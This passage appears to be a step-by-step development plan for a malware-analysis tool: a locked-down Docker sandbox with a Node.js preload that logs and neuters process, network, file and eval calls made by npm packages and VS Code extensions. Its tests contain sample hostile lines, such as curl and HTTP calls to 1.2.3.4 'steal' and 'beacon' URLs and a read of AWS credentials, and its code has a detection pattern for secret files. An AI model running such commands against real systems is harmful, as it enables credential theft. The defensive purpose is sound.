# npm-ide-analyst — Plan B: Dynamic Detonation Sandbox

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add dynamic behavioral analysis: detonate an npm package or VS Code–family extension inside a hardened, network-isolated Docker container running an **instrumented Node.js harness**, capture what it actually does at runtime (process exec, network, filesystem, secret access, de-obfuscated code), fold that into the existing `Report`, and correlate a timeline.

**Architecture:** Plan A's Python orchestrator gains a `sandbox/` subsystem. The orchestrator still never executes sample code — it shells `docker run`. Inside the container, a Node preload (`node -r preload.js`) monkey-patches dangerous APIs before the payload loads, logging every call as a JSON-lines event and neutering the harmful ones. Captured events are parsed back in Python into `BehaviorEvent`s (raw log) and derived `Finding`s (scored, so `verdict`/`score` reflect runtime behavior). A `correlate/` module merges evidence timestamps with detonation events. Reuses every model and report type from Plan A.

**Tech Stack:** Python 3.11+ (orchestration, parsing, correlation), Node.js (the in-container harness — targeted at the container's Node, host Node only for harness unit tests), Docker (Linux containers). New Python deps: none beyond Plan A. Node harness uses only Node built-ins (no npm install inside the payload's tree).

## Global Constraints

- Python floor **3.11+**; package import name `npm_ide_analyst`; CLI `npm-ide-analyst`.
- **Safety invariant (unchanged, extended):** the Python orchestrator may NOT import/exec/eval/require or run sample code. The ONLY place sample code executes is inside the Docker container via the Node harness. The orchestrator interacts with detonation solely through `subprocess` calls to `docker` and by reading the container's JSON-lines event log as data.
- **Detonation isolation is mandatory and fixed:** every `docker run` MUST include `--network none`, `--user` (non-root), `--cap-drop ALL`, `--security-opt no-new-privileges`, `--read-only` root fs (writable `--tmpfs` workdir only), `--memory`, `--cpus`, `--pids-limit`, and a hard wall-clock timeout that kills the container. The sample is mounted **read-only**; no real user directory is ever mounted. If any of these cannot be applied, detonation MUST refuse to run rather than degrade.
- **Detonation runtime is Linux** (Docker Desktop, Linux containers), per the spec. Payloads branching on `process.platform === 'win32'` take the non-Windows path — accepted.
- Reports remain **offline/self-contained**: no network at render or view time; HTML inlines all CSS.
- Behavior events feed `Finding`s so `Report.verdict`/`Report.score` incorporate dynamic results; the raw behavior log is attached for detail.
- TDD throughout: failing test first, minimal code, frequent commits. Docker/Node integration tests are **gated** behind availability checks and skip cleanly when the tool is absent (unit tests never require Docker).

## Design refinement vs the spec (READ — confirm on review)

The spec described the sinkhole as a **separate DNS+HTTP responder container** on an internal network. This plan realizes fakenet **in-process inside the harness** instead: the network hooks fully capture each attempted request (method, URL, headers, body, resolved host/port) and return a synthetic response, while the container runs with **`--network none`** (true isolation, nothing can leave). Rationale: it is strictly safer (no network at all vs an internal one), fully deterministic (no DNS/routing race), simpler to test, and most of these payloads use hardcoded IPs that a DNS sinkhole wouldn't catch anyway. **Tradeoff:** we do not capture multi-round C2 *dialogs* that depend on real server replies — we see the outbound request and body, not a live back-and-forth. For triage that is sufficient. A real sinkhole container remains a future extension (noted in §Out of scope). If you need live C2 dialog capture, stop and revise before implementing.

---

## File Structure

```
src/npm_ide_analyst/
├── models.py                    # MODIFY: add BehaviorEvent, TimelineEntry; extend Report
├── cli.py                       # MODIFY: add --dynamic flag to analyze; add `report` subcommand
├── report/
│   ├── json_report.py           # MODIFY: serialize behavior + timeline
│   └── template.html.j2          # MODIFY: add Dynamic Behavior + Timeline sections
├── sandbox/
│   ├── __init__.py
│   ├── events.py                # parse JSON-lines event log -> list[BehaviorEvent]
│   ├── findings.py              # BehaviorEvent list -> list[Finding] (scored)
│   ├── orchestrator.py          # docker lifecycle: build/run hardened container, ingest log
│   ├── docker/
│   │   └── Dockerfile           # hardened node image with harness baked in
│   └── harness/                 # Node.js (container runtime)
│       ├── preload.js           # instrumentation: hooks + event emitter
│       ├── emit.js              # JSON-lines event writer (shared)
│       ├── vscode-mock.js       # mock `vscode` module + ExtensionContext
│       ├── run-npm.js           # detonate npm lifecycle + main
│       └── run-vsix.js          # detonate extension activate()
└── correlate/
    ├── __init__.py
    └── timeline.py              # merge evidence timestamps + behavior events -> timeline
tests/
├── fixtures/harness/            # synthetic detonation fixtures (trusted test drivers, not real malware)
├── test_sandbox_events.py
├── test_sandbox_findings.py
├── test_harness_hooks.py        # gated on node
├── test_sandbox_orchestrator.py # gated on docker
├── test_timeline.py
├── test_report_dynamic.py
└── test_cli_dynamic.py          # gated on docker
```

---

### Task 1: Extend models and reports for behavior + timeline

**Files:**
- Modify: `src/npm_ide_analyst/models.py`
- Modify: `src/npm_ide_analyst/report/json_report.py`
- Modify: `src/npm_ide_analyst/report/template.html.j2`
- Test: `tests/test_report_dynamic.py`

**Interfaces:**
- Consumes: `Report`, `Sample`, `Finding`, `Severity` (Plan A).
- Produces:
  - `@dataclass BehaviorEvent`: `kind: str` (e.g. `process`, `network`, `dns`, `file`, `secret`, `eval`, `decode`, `require`), `detail: str`, `data: dict` (default empty), `ts: float | None = None` (monotonic ms from harness), `stack: str | None = None`.
  - `@dataclass TimelineEntry`: `ts: str` (ISO or relative label), `source: str`, `event: str`.
  - `Report` gains `behavior: list[BehaviorEvent] = field(default_factory=list)` and `timeline: list[TimelineEntry] = field(default_factory=list)` (added AFTER existing defaulted fields — backward compatible).
  - `report_to_dict` gains `"behavior"` and `"timeline"` keys.

- [ ] **Step 1: Write the failing test**

```python
# tests/test_report_dynamic.py
from pathlib import Path
from npm_ide_analyst.models import (
    Report, Sample, Finding, Severity, ArtifactType, BehaviorEvent, TimelineEntry,
)
from npm_ide_analyst.report.json_report import report_to_dict
from npm_ide_analyst.report.html_report import write_html


def _sample():
    return Sample(name="evil", version="1.0.0", artifact_type=ArtifactType.EXTENSION,
                  root=Path("/tmp/x"), sha256="a" * 64, sha512="b" * 128)


def test_report_dict_includes_behavior_and_timeline():
    r = Report(
        sample=_sample(),
        findings=[Finding(id="D1", title="C2 beacon", severity=Severity.HIGH,
                          category="network", detail="POST to 1.2.3.4")],
        generated_at="t",
        behavior=[BehaviorEvent(kind="network", detail="POST http://1.2.3.4/x",
                                data={"host": "1.2.3.4", "body": "stolen"})],
        timeline=[TimelineEntry(ts="t0", source="detonation", event="activate() called")],
    )
    d = report_to_dict(r)
    assert d["behavior"][0]["kind"] == "network"
    assert d["behavior"][0]["data"]["host"] == "1.2.3.4"
    assert d["timeline"][0]["source"] == "detonation"


def test_html_renders_behavior_section(tmp_path):
    r = Report(sample=_sample(), findings=[], generated_at="t",
               behavior=[BehaviorEvent(kind="process", detail="spawn curl")],
               timeline=[TimelineEntry(ts="t0", source="detonation", event="spawn curl")])
    out = tmp_path / "r.html"
    write_html(r, out)
    html = out.read_text(encoding="utf-8")
    assert "Dynamic Behavior" in html
    assert "spawn curl" in html
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_report_dynamic.py -v`
Expected: FAIL — `ImportError: cannot import name 'BehaviorEvent'`.

- [ ] **Step 3: Extend models.py**

Add to `src/npm_ide_analyst/models.py` (after the existing `Finding` dataclass, and extend `Report`):

```python
@dataclass
class BehaviorEvent:
    kind: str
    detail: str
    data: dict = field(default_factory=dict)
    ts: float | None = None
    stack: str | None = None


@dataclass
class TimelineEntry:
    ts: str
    source: str
    event: str
```

Extend the `Report` dataclass — add these two fields after `generated_at`:

```python
    behavior: list[BehaviorEvent] = field(default_factory=list)
    timeline: list[TimelineEntry] = field(default_factory=list)
```

(Leave `score`/`verdict` unchanged — dynamic `Finding`s are appended to `findings` by later tasks, so they already flow into the score.)

- [ ] **Step 4: Extend json_report.py**

In `src/npm_ide_analyst/report/json_report.py`, update `report_to_dict` to append the two keys before returning:

```python
    from dataclasses import asdict  # already imported at top; do not duplicate
    result = {
        "generated_at": report.generated_at,
        "verdict": report.verdict,
        "score": report.score,
        "sample": sample,
        "findings": [
            {**asdict(f), "severity": str(f.severity)} for f in report.findings
        ],
        "behavior": [asdict(b) for b in report.behavior],
        "timeline": [asdict(t) for t in report.timeline],
    }
    return result
```

(Replace the existing `return {...}` block with the above; keep the `sample` construction lines above it unchanged.)

- [ ] **Step 5: Extend template.html.j2**

In `src/npm_ide_analyst/report/template.html.j2`, add before `</body>`:

```jinja
{% if r.behavior %}
<h2>Dynamic Behavior ({{ r.behavior | length }})</h2>
<table>
<tr><th>Kind</th><th>Detail</th><th>Data</th></tr>
{% for b in r.behavior %}
<tr><td>{{ b.kind }}</td><td>{{ b.detail }}</td>
    <td><code>{{ b.data }}</code></td></tr>
{% endfor %}
</table>
{% endif %}
{% if r.timeline %}
<h2>Timeline ({{ r.timeline | length }})</h2>
<table>
<tr><th>Time</th><th>Source</th><th>Event</th></tr>
{% for t in r.timeline %}
<tr><td>{{ t.ts }}</td><td>{{ t.source }}</td><td>{{ t.event }}</td></tr>
{% endfor %}
</table>
{% endif %}
```

- [ ] **Step 6: Run tests + full suite**

Run: `python -m pytest tests/test_report_dynamic.py -v && python -m pytest -q`
Expected: new tests PASS; full suite still green (Plan A unaffected — new fields default to empty).

- [ ] **Step 7: Commit**

```bash
git add src/npm_ide_analyst/models.py src/npm_ide_analyst/report/json_report.py src/npm_ide_analyst/report/template.html.j2 tests/test_report_dynamic.py
git commit -m "feat: extend Report with behavior + timeline sections"
```

---

### Task 2: Node harness — instrumentation preload

**Files:**
- Create: `src/npm_ide_analyst/sandbox/__init__.py` (empty)
- Create: `src/npm_ide_analyst/sandbox/harness/emit.js`
- Create: `src/npm_ide_analyst/sandbox/harness/preload.js`
- Create: `tests/fixtures/harness/trusted_driver.js`
- Test: `tests/test_harness_hooks.py` (gated on node)

**Interfaces:**
- `emit.js` exports `emit(kind, detail, data)` — appends one JSON line `{kind, detail, data, ts, stack}` to the file named by env `ANALYST_EVENT_LOG` (fallback: stdout). `ts` is `performance.now()`; `stack` is a trimmed capture.
- `preload.js` monkey-patches, at load time (before any payload): `child_process` (exec/execSync/spawn/spawnSync/execFile/fork), `http`/`https` (`request`/`get`), `net.Socket.prototype.connect`, `dns` (lookup/resolve*), `fs` (readFile/readFileSync/writeFile/writeFileSync/createReadStream), global `eval`/`Function`, and `Buffer.from(x,'base64')`/global `atob`. Dangerous ops are LOGGED and NEUTERED (return synthetic values), except `eval`/`Function` which log the (de-obfuscated) code then still execute it (the container is the safety boundary, and executing is how deeper behavior is revealed).

**Note on the test:** the "payload" in this task's test is a **trusted test driver** (`trusted_driver.js`) that the test itself wrote — it deliberately calls the hooked APIs so we can assert they were logged. No untrusted sample is executed; this runs host Node safely because every dangerous call is neutered by the hooks.

- [ ] **Step 1: Write the failing test**

```python
# tests/test_harness_hooks.py
import json
import os
import shutil
import subprocess
from pathlib import Path

import pytest

HARNESS = Path("src/npm_ide_analyst/sandbox/harness")
pytestmark = pytest.mark.skipif(shutil.which("node") is None, reason="node not installed")


def _run_driver(tmp_path: Path, driver_src: str) -> list[dict]:
    driver = tmp_path / "driver.js"
    driver.write_text(driver_src, encoding="utf-8")
    log = tmp_path / "events.jsonl"
    preload = (HARNESS / "preload.js").resolve()
    env = {**os.environ, "ANALYST_EVENT_LOG": str(log)}
    subprocess.run(["node", "-r", str(preload), str(driver)],
                   env=env, timeout=30, capture_output=True)
    if not log.exists():
        return []
    return [json.loads(line) for line in log.read_text().splitlines() if line.strip()]


def test_hooks_process_exec(tmp_path):
    events = _run_driver(tmp_path,
        "const cp=require('child_process'); cp.exec('curl http://1.2.3.4/x', ()=>{});")
    assert any(e["kind"] == "process" and "curl" in e["detail"] for e in events)


def test_hooks_network_captures_url(tmp_path):
    events = _run_driver(tmp_path,
        "require('http').request('http://1.2.3.4/steal', ()=>{}).end();")
    assert any(e["kind"] == "network" and "1.2.3.4" in e["detail"] for e in events)


def test_hooks_eval_logs_decoded_code(tmp_path):
    import base64
    # Decoded code must (a) trip the decode hook's malware-keyword filter
    # (contains "require"/"http") and (b) eval cleanly in global scope
    # (indirect eval has no local `require`), so use a keyword-bearing comment.
    code = "1 /* require http */"
    b64 = base64.b64encode(code.encode()).decode()
    events = _run_driver(tmp_path,
        f"eval(Buffer.from('{b64}','base64').toString());")
    assert any(e["kind"] == "decode" for e in events)
    assert any(e["kind"] == "eval" for e in events)


def test_hooks_sensitive_file_read(tmp_path):
    events = _run_driver(tmp_path,
        "try{require('fs').readFileSync('/root/.aws/credentials')}catch(e){}")
    assert any(e["kind"] in ("file", "secret") and "credentials" in e["detail"]
               for e in events)
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_harness_hooks.py -v`
Expected: FAIL — preload.js does not exist (or events empty).

- [ ] **Step 3: Write emit.js**

```javascript
// src/npm_ide_analyst/sandbox/harness/emit.js
'use strict';
const fs = require('fs');
const { performance } = require('perf_hooks');

const LOG = process.env.ANALYST_EVENT_LOG;

function emit(kind, detail, data) {
  const rec = {
    kind,
    detail: String(detail).slice(0, 2000),
    data: data || {},
    ts: performance.now(),
    stack: (new Error().stack || '').split('\n').slice(2, 5).join(' | ').slice(0, 500),
  };
  const line = JSON.stringify(rec) + '\n';
  try {
    if (LOG) fs.appendFileSync(LOG, line);
    else process.stdout.write(line);
  } catch (_) { /* never let logging throw into the payload */ }
}

module.exports = { emit };
```

- [ ] **Step 4: Write preload.js**

```javascript
// src/npm_ide_analyst/sandbox/harness/preload.js
'use strict';
const { emit } = require('./emit.js');

// --- child_process: log + neuter ---
const cp = require('child_process');
for (const fn of ['exec', 'execSync', 'spawn', 'spawnSync', 'execFile', 'execFileSync', 'fork']) {
  if (typeof cp[fn] !== 'function') continue;
  const orig = cp[fn];
  cp[fn] = function (...args) {
    emit('process', `${fn}: ${JSON.stringify(args[0])}`, { fn, args: args.slice(0, 2) });
    // Neuter: do not actually spawn. Return a benign stub.
    if (fn.endsWith('Sync')) return Buffer.from('');
    const cb = args.find((a) => typeof a === 'function');
    if (cb) process.nextTick(() => cb(null, '', ''));
    const { EventEmitter } = require('events');
    const stub = new EventEmitter();
    stub.stdout = new EventEmitter();
    stub.stderr = new EventEmitter();
    stub.kill = () => {};
    return stub;
  };
}

// --- network: http/https request/get: log + neuter ---
function hookHttp(mod, scheme) {
  for (const fn of ['request', 'get']) {
    const orig = mod[fn];
    if (typeof orig !== 'function') continue;
    mod[fn] = function (...args) {
      let url = args[0];
      if (typeof url === 'object' && url) {
        url = `${url.protocol || scheme + ':'}//${url.host || url.hostname}${url.path || ''}`;
      }
      emit('network', `${scheme} ${fn}: ${url}`, { scheme, url: String(url) });
      const { EventEmitter } = require('events');
      const req = new EventEmitter();
      req.write = (chunk) => { emit('network', `body: ${chunk}`, { body: String(chunk).slice(0, 2000) }); return true; };
      req.end = () => {};
      req.setHeader = () => {};
      req.abort = () => {};
      return req; // neutered: never opens a socket
    };
  }
}
hookHttp(require('http'), 'http');
hookHttp(require('https'), 'https');

// --- net.Socket.connect: log + neuter ---
const net = require('net');
const origConnect = net.Socket.prototype.connect;
net.Socket.prototype.connect = function (...args) {
  const opt = args[0];
  const target = typeof opt === 'object' ? `${opt.host || opt.path}:${opt.port || ''}` : String(opt);
  emit('network', `socket connect: ${target}`, { target });
  this.destroy && this.destroy();
  return this; // neutered
};

// --- dns: log, return sinkhole answers ---
const dns = require('dns');
for (const fn of ['lookup', 'resolve', 'resolve4', 'resolve6']) {
  if (typeof dns[fn] !== 'function') continue;
  dns[fn] = function (host, ...rest) {
    emit('dns', `${fn}: ${host}`, { host });
    const cb = rest.find((a) => typeof a === 'function');
    if (cb) process.nextTick(() => cb(null, fn === 'lookup' ? '127.0.0.1' : ['127.0.0.1']));
  };
}

// --- fs: log reads (flag sensitive), neuter writes ---
const fs = require('fs');
const SENSITIVE = /\.ssh|\.aws|\.npmrc|\.env|credentials|id_rsa|cookies|Login Data|\.docker/i;
function classify(p) { return SENSITIVE.test(String(p)) ? 'secret' : 'file'; }
for (const fn of ['readFile', 'readFileSync', 'createReadStream']) {
  const orig = fs[fn];
  if (typeof orig !== 'function') continue;
  fs[fn] = function (p, ...rest) {
    emit(classify(p), `${fn}: ${p}`, { path: String(p) });
    return orig.apply(fs, [p, ...rest]); // allow read (canary data planted by container)
  };
}
for (const fn of ['writeFile', 'writeFileSync', 'appendFileSync']) {
  const orig = fs[fn];
  if (typeof orig !== 'function') continue;
  fs[fn] = function (p, data, ...rest) {
    // Never let the payload write outside the tmp workdir; log intent, neuter absolute/escape paths.
    emit('file', `${fn}: ${p}`, { path: String(p), write: true });
    if (String(p).startsWith('/work/')) return orig.apply(fs, [p, data, ...rest]);
    return undefined; // neutered
  };
}

// --- decode helpers: log decoded payloads ---
const origBufFrom = Buffer.from;
Buffer.from = function (value, enc, ...rest) {
  if (enc === 'base64' && typeof value === 'string') {
    try {
      const decoded = origBufFrom.call(Buffer, value, 'base64').toString('utf8');
      if (/https?:|eval|require|process|child_process/i.test(decoded)) {
        emit('decode', `base64 -> ${decoded.slice(0, 300)}`, { decoded: decoded.slice(0, 2000) });
      }
    } catch (_) {}
  }
  return origBufFrom.call(Buffer, value, enc, ...rest);
};
if (typeof globalThis.atob === 'function') {
  const origAtob = globalThis.atob;
  globalThis.atob = function (s) {
    const out = origAtob(s);
    emit('decode', `atob -> ${out.slice(0, 300)}`, { decoded: out.slice(0, 2000) });
    return out;
  };
}

// --- eval / Function: log de-obfuscated code, then still run it ---
const origEval = globalThis.eval;
// NOTE: reassigning eval to a wrapper makes it an indirect eval (global scope) — acceptable here.
globalThis.eval = function (code) {
  emit('eval', `eval: ${String(code).slice(0, 300)}`, { code: String(code).slice(0, 2000) });
  return origEval(code);
};
const OrigFunction = globalThis.Function;
globalThis.Function = new Proxy(OrigFunction, {
  apply(target, thisArg, args) {
    emit('eval', `Function(): ${args.map(String).join(',').slice(0, 300)}`, { code: args.map(String).join(',').slice(0, 2000) });
    return Reflect.apply(target, thisArg, args);
  },
  construct(target, args) {
    emit('eval', `new Function(): ${args.map(String).join(',').slice(0, 300)}`, { code: args.map(String).join(',').slice(0, 2000) });
    return Reflect.construct(target, args);
  },
});

emit('harness', 'preload installed', {});
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `python -m pytest tests/test_harness_hooks.py -v`
Expected: PASS (4 tests). If `node` is absent the tests skip — run on a machine with Node for real verification.

- [ ] **Step 6: Commit**

```bash
git add src/npm_ide_analyst/sandbox/__init__.py src/npm_ide_analyst/sandbox/harness/emit.js src/npm_ide_analyst/sandbox/harness/preload.js tests/test_harness_hooks.py
git commit -m "feat: instrumented Node preload (process/net/fs/eval/decode hooks)"
```

> `tests/fixtures/harness/trusted_driver.js` is created inline by the test via `tmp_path`; no committed fixture needed. Remove it from the Files list if your reviewer prefers — it is not written to the repo.

---

### Task 3: Node harness — vscode mock + detonation entrypoints

**Files:**
- Create: `src/npm_ide_analyst/sandbox/harness/vscode-mock.js`
- Create: `src/npm_ide_analyst/sandbox/harness/run-npm.js`
- Create: `src/npm_ide_analyst/sandbox/harness/run-vsix.js`
- Test: `tests/test_harness_entrypoints.py` (gated on node)

**Interfaces:**
- `vscode-mock.js` exports a mock `vscode` module object and installs a `require` interceptor (via `Module._load` patch) so `require('vscode')` returns the mock. Mock includes `commands.registerCommand`, `window.showInformationMessage`, `workspace`, `env`, `secrets.get/store`, and a `makeContext()` returning a mock `ExtensionContext` (`subscriptions:[]`, `globalState`, `secrets`, `extensionPath`). Every mock method emits a `vscode` behavior event.
- `run-npm.js` — reads the sample's `package.json` (path from `ANALYST_SAMPLE_DIR`), emits an event per lifecycle script, `require()`s each lifecycle script file that is a `node <file>` invocation, then `require()`s the package `main`. Wrapped in try/catch; emits `detonation` start/end.
- `run-vsix.js` — reads `package.json`, `require()`s the `main` entry, calls `activate(makeContext())` if exported, awaits it, then emits `detonation` end.

- [ ] **Step 1: Write the failing test**

```python
# tests/test_harness_entrypoints.py
import json
import os
import shutil
import subprocess
from pathlib import Path

import pytest

HARNESS = Path("src/npm_ide_analyst/sandbox/harness")
pytestmark = pytest.mark.skipif(shutil.which("node") is None, reason="node not installed")


def _detonate(entry: str, sample_dir: Path, tmp_path: Path) -> list[dict]:
    log = tmp_path / "events.jsonl"
    preload = (HARNESS / "preload.js").resolve()
    runner = (HARNESS / entry).resolve()
    env = {**os.environ, "ANALYST_EVENT_LOG": str(log),
           "ANALYST_SAMPLE_DIR": str(sample_dir)}
    subprocess.run(["node", "-r", str(preload), str(runner)],
                   env=env, timeout=30, capture_output=True)
    return [json.loads(l) for l in log.read_text().splitlines() if l.strip()] if log.exists() else []


def test_vsix_activate_is_called(tmp_path):
    sample = tmp_path / "ext"
    sample.mkdir()
    (sample / "package.json").write_text(json.dumps({"name": "e", "main": "./extension.js"}))
    (sample / "extension.js").write_text(
        "const vscode=require('vscode');"
        "exports.activate=(ctx)=>{require('http').get('http://1.2.3.4/beacon');};",
        encoding="utf-8")
    events = _detonate("run-vsix.js", sample, tmp_path)
    assert any(e["kind"] == "network" and "1.2.3.4" in e["detail"] for e in events)
    assert any(e["kind"] == "detonation" for e in events)


def test_npm_postinstall_script_runs(tmp_path):
    sample = tmp_path / "pkg"
    sample.mkdir()
    (sample / "package.json").write_text(json.dumps(
        {"name": "p", "main": "./index.js", "scripts": {"postinstall": "node ./evil.js"}}))
    (sample / "evil.js").write_text(
        "require('child_process').exec('whoami');", encoding="utf-8")
    (sample / "index.js").write_text("", encoding="utf-8")
    events = _detonate("run-npm.js", sample, tmp_path)
    assert any(e["kind"] == "process" and "whoami" in e["detail"] for e in events)
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_harness_entrypoints.py -v`
Expected: FAIL — entrypoints do not exist.

- [ ] **Step 3: Write vscode-mock.js**

```javascript
// src/npm_ide_analyst/sandbox/harness/vscode-mock.js
'use strict';
const Module = require('module');
const { emit } = require('./emit.js');

const disposable = { dispose() {} };

const vscode = {
  commands: {
    registerCommand: (id, fn) => { emit('vscode', `registerCommand: ${id}`, { id }); return disposable; },
    executeCommand: (id, ...a) => { emit('vscode', `executeCommand: ${id}`, { id }); return Promise.resolve(); },
  },
  window: {
    showInformationMessage: (m) => { emit('vscode', `showInformationMessage: ${m}`, {}); return Promise.resolve(); },
    showErrorMessage: (m) => { emit('vscode', `showErrorMessage: ${m}`, {}); return Promise.resolve(); },
    createOutputChannel: () => ({ appendLine() {}, show() {}, dispose() {} }),
  },
  workspace: {
    getConfiguration: () => ({ get: () => undefined, update: () => Promise.resolve() }),
    workspaceFolders: [],
    onDidChangeTextDocument: () => disposable,
  },
  env: {
    machineId: 'mock-machine', sessionId: 'mock-session',
    openExternal: (u) => { emit('vscode', `openExternal: ${u}`, { url: String(u) }); return Promise.resolve(true); },
    clipboard: { writeText: () => Promise.resolve(), readText: () => Promise.resolve('') },
  },
  Uri: { parse: (s) => ({ toString: () => s }), file: (s) => ({ fsPath: s }) },
  ExtensionMode: { Production: 1, Development: 2, Test: 3 },
};

function makeContext() {
  return {
    subscriptions: [],
    extensionPath: process.env.ANALYST_SAMPLE_DIR || '/work/sample',
    globalState: { get: () => undefined, update: () => Promise.resolve(), keys: () => [] },
    workspaceState: { get: () => undefined, update: () => Promise.resolve() },
    secrets: {
      get: (k) => { emit('vscode', `secrets.get: ${k}`, { key: k }); return Promise.resolve('mock-secret'); },
      store: (k, v) => { emit('secret', `secrets.store: ${k}`, { key: k }); return Promise.resolve(); },
    },
    globalStorageUri: { fsPath: '/work/storage' },
  };
}

// Intercept require('vscode')
const origLoad = Module._load;
Module._load = function (request, parent, isMain) {
  if (request === 'vscode') return vscode;
  return origLoad.apply(this, arguments);
};

module.exports = { vscode, makeContext };
```

- [ ] **Step 4: Write run-vsix.js**

```javascript
// src/npm_ide_analyst/sandbox/harness/run-vsix.js
'use strict';
const path = require('path');
const fs = require('fs');
const { emit } = require('./emit.js');
const { makeContext } = require('./vscode-mock.js');

async function main() {
  const dir = process.env.ANALYST_SAMPLE_DIR || '/work/sample';
  emit('detonation', 'vsix detonation start', { dir });
  let manifest = {};
  try { manifest = JSON.parse(fs.readFileSync(path.join(dir, 'package.json'), 'utf8')); }
  catch (e) { emit('detonation', 'no package.json', {}); }
  const mainRel = manifest.main || './extension.js';
  try {
    const mod = require(path.resolve(dir, mainRel));
    if (mod && typeof mod.activate === 'function') {
      emit('detonation', 'calling activate()', {});
      await Promise.resolve(mod.activate(makeContext()));
    } else {
      emit('detonation', 'no activate() export', {});
    }
  } catch (e) {
    emit('detonation', `error: ${e && e.message}`, {});
  }
  emit('detonation', 'vsix detonation end', {});
}
main().then(() => setTimeout(() => process.exit(0), 200));
```

- [ ] **Step 5: Write run-npm.js**

```javascript
// src/npm_ide_analyst/sandbox/harness/run-npm.js
'use strict';
const path = require('path');
const fs = require('fs');
const { emit } = require('./emit.js');

function main() {
  const dir = process.env.ANALYST_SAMPLE_DIR || '/work/sample';
  emit('detonation', 'npm detonation start', { dir });
  let manifest = {};
  try { manifest = JSON.parse(fs.readFileSync(path.join(dir, 'package.json'), 'utf8')); }
  catch (e) { emit('detonation', 'no package.json', {}); }

  const scripts = manifest.scripts || {};
  for (const hook of ['preinstall', 'install', 'postinstall']) {
    const cmd = scripts[hook];
    if (!cmd) continue;
    emit('detonation', `lifecycle ${hook}: ${cmd}`, { hook, cmd });
    const m = /node\s+(\S+)/.exec(cmd);
    if (m) {
      try { require(path.resolve(dir, m[1])); }
      catch (e) { emit('detonation', `lifecycle ${hook} error: ${e && e.message}`, {}); }
    }
  }
  if (manifest.main) {
    try { require(path.resolve(dir, manifest.main)); }
    catch (e) { emit('detonation', `main error: ${e && e.message}`, {}); }
  }
  emit('detonation', 'npm detonation end', {});
}
main();
setTimeout(() => process.exit(0), 200);
```

- [ ] **Step 6: Run tests to verify they pass**

Run: `python -m pytest tests/test_harness_entrypoints.py -v`
Expected: PASS (2 tests), or skip if node absent.

- [ ] **Step 7: Commit**

```bash
git add src/npm_ide_analyst/sandbox/harness/vscode-mock.js src/npm_ide_analyst/sandbox/harness/run-npm.js src/npm_ide_analyst/sandbox/harness/run-vsix.js tests/test_harness_entrypoints.py
git commit -m "feat: vscode mock + npm/vsix detonation entrypoints"
```

---

### Task 4: Event-log parser (Python)

**Files:**
- Create: `src/npm_ide_analyst/sandbox/events.py`
- Test: `tests/test_sandbox_events.py`

**Interfaces:**
- Consumes: `BehaviorEvent` (Task 1).
- Produces:
  - `def parse_event_log(text: str) -> list[BehaviorEvent]` — parses JSON-lines; skips blank/malformed lines; maps `{kind, detail, data, ts, stack}` to `BehaviorEvent`. Ignores the internal `harness` bookkeeping kind.
  - `def load_event_log(path: Path) -> list[BehaviorEvent]` — reads a file (empty list if missing).

- [ ] **Step 1: Write the failing test**

```python
# tests/test_sandbox_events.py
from npm_ide_analyst.sandbox.events import parse_event_log


def test_parses_jsonl_and_skips_bad_lines():
    text = (
        '{"kind":"process","detail":"exec: curl","data":{"fn":"exec"},"ts":1.5}\n'
        '\n'
        'not-json\n'
        '{"kind":"network","detail":"http request: http://1.2.3.4","data":{},"ts":2.0}\n'
        '{"kind":"harness","detail":"preload installed","data":{}}\n'
    )
    events = parse_event_log(text)
    kinds = [e.kind for e in events]
    assert kinds == ["process", "network"]         # bad lines skipped, 'harness' filtered
    assert events[0].detail == "exec: curl"
    assert events[1].data == {}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_sandbox_events.py -v`
Expected: FAIL — module missing.

- [ ] **Step 3: Write implementation**

```python
# src/npm_ide_analyst/sandbox/events.py
from __future__ import annotations

import json
from pathlib import Path

from ..models import BehaviorEvent

_INTERNAL = {"harness"}


def parse_event_log(text: str) -> list[BehaviorEvent]:
    events: list[BehaviorEvent] = []
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            rec = json.loads(line)
        except json.JSONDecodeError:
            continue
        if not isinstance(rec, dict) or "kind" not in rec:
            continue
        if rec["kind"] in _INTERNAL:
            continue
        events.append(BehaviorEvent(
            kind=str(rec.get("kind", "")),
            detail=str(rec.get("detail", "")),
            data=rec.get("data") or {},
            ts=rec.get("ts"),
            stack=rec.get("stack"),
        ))
    return events


def load_event_log(path: Path) -> list[BehaviorEvent]:
    if not path.exists():
        return []
    return parse_event_log(path.read_text(encoding="utf-8", errors="replace"))
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_sandbox_events.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/npm_ide_analyst/sandbox/events.py tests/test_sandbox_events.py
git commit -m "feat: parse harness JSON-lines event log into BehaviorEvents"
```

---

### Task 5: Behavior → Findings mapping (Python)

**Files:**
- Create: `src/npm_ide_analyst/sandbox/findings.py`
- Test: `tests/test_sandbox_findings.py`

**Interfaces:**
- Consumes: `BehaviorEvent` (Task 1), `Finding`, `Severity` (Plan A).
- Produces: `def behavior_to_findings(events: list[BehaviorEvent]) -> list[Finding]` — derives scored findings from runtime behavior. Mapping: `process` → HIGH `process-exec`; `network` (request/connect) → HIGH `network` (raw-IP stays HIGH); `secret` → HIGH `secret-access`; `eval` → HIGH `dynamic-code`; `decode` → MEDIUM `obfuscation`; `dns` → LOW `network`; `vscode` (openExternal/secrets) → MEDIUM `extension-behavior`; `file` writes → LOW `file-write`. De-duplicated by `(category, detail)`; each finding cites `evidence` from the event and marks `location="[dynamic]"`.

- [ ] **Step 1: Write the failing test**

```python
# tests/test_sandbox_findings.py
from npm_ide_analyst.models import BehaviorEvent, Severity
from npm_ide_analyst.sandbox.findings import behavior_to_findings


def test_maps_process_and_network_to_high():
    events = [
        BehaviorEvent(kind="process", detail="exec: curl http://1.2.3.4"),
        BehaviorEvent(kind="network", detail="http request: http://1.2.3.4/steal"),
        BehaviorEvent(kind="secret", detail="readFileSync: /root/.aws/credentials"),
        BehaviorEvent(kind="decode", detail="base64 -> http://evil"),
    ]
    findings = behavior_to_findings(events)
    cats = {f.category: f.severity for f in findings}
